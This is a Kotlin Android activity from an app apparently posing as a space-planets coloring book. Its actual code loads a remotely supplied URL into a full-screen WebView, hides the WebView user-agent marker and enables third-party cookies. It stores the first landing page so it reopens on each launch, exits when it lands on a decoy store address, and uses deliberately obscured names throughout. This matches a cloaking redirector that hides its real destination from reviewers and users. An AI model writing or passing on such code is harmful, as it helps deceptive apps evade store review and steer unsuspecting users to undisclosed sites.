package com.Element196.SpacePlanetsColoringBoo

import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.Element196.SpacePlanetsColoringBoo.databinding.ActivityMainBinding
import com.Element196.SpacePlanetsColoringBoo.hatred.SweetBunny
import com.element196.utils.BopaView
import com.element196.utils.element.GonDo
import com.element196.utils.leta.Control.mainControl
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    private var edin = true
    private lateinit var oi: BopaView
    private lateinit var activityResultLauncher: ActivityResultLauncher<String>
    private var frgs: ValueCallback<Array<Uri>>? = null

    private val bold: ActivityMainBinding by lazy {
        ActivityMainBinding.inflate(layoutInflater)
    }

    private var global = ""
    private val COSMOS = "nmop"

    private lateinit var fat: SharedPreferences
    private lateinit var edr: SharedPreferences.Editor

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(bold.root)
        activityResultLauncher =
            registerForActivityResult(ActivityResultContracts.GetMultipleContents()) {
                frgs?.onReceiveValue(it.toTypedArray())
            }
        oi = ViewModelProvider(this)[BopaView::class.java]

        fat = getSharedPreferences("contentResolver", MODE_PRIVATE)
        edr = fat.edit()

        val greenDaoApp = application as SweetBunny
        val daoSession = greenDaoApp.daoSession
        val treasureDao = daoSession.gonDoDao
        val story = (application as SweetBunny).gonDo
        if (treasureDao.count() != 0L) {
            bold.rop.loadUrl(fat.getString(COSMOS, "")!!)
            Log.d("TEST___U",fat.getString(COSMOS, "").toString())
        } else {
            lifecycleScope.launch {
                oi.asset(this@MainActivity)
            }
            lifecycleScope.launch {
                mainControl.collect() {
                    Log.d("TEST___", it)
                    global = it
                    bold.rop.loadUrl(it)
                }
            }
        }
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(bold.rop, true)

        onBackPressedDispatcher.addCallback(
            this,
            object : OnBackPressedCallback(edin) {
                override fun handleOnBackPressed() {
                    if (bold.rop.canGoBack()) bold.rop.goBack()
                }
            })

        bold.rop.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView,
                fpc: ValueCallback<Array<Uri>>,
                params: FileChooserParams?
            ): Boolean {
                if (edin) {
                    frgs = fpc
                    activityResultLauncher.launch("image/*")
                }
                return true
            }
        }
        bold.rop.settings.javaScriptEnabled = true
        bold.rop.settings.userAgentString =
            bold.rop.settings.userAgentString.replace("wv", "")
        bold.rop.settings.domStorageEnabled = true

        bold.rop.webViewClient = object : WebViewClient() {
            override fun onPageFinished(rtyu: WebView?, defdf: String) {
                super.onPageFinished(rtyu, defdf)
                CookieManager.getInstance().flush()

                if (defdf == "https://gonzosarmour.store/") {
//                    startActivity(Intent(this@Vitol, VikingActivity::class.java))
                    finish()
                } else {
                    bold.rop.visibility = View.VISIBLE

                    if (global != defdf) {
                        if (story?.gordon.toString() != "rok") {
                            if(!fat.contains(COSMOS)){
                                treasureDao.insert(GonDo().apply {
                                    this.gon = "0"
                                    this.dor = defdf
                                    this.gordon = "rok"
                                }.also {
                                    greenDaoApp.gonDo = it
                                    edr.putString(COSMOS, defdf)
                                    edr.apply()
                                })
                                Log.d("TEST___NOI", defdf)
                                Log.d("TEST___NOIYR76", greenDaoApp.gonDo.toString())
                            }
                        }
                    }
                }
            }
        }
    }
}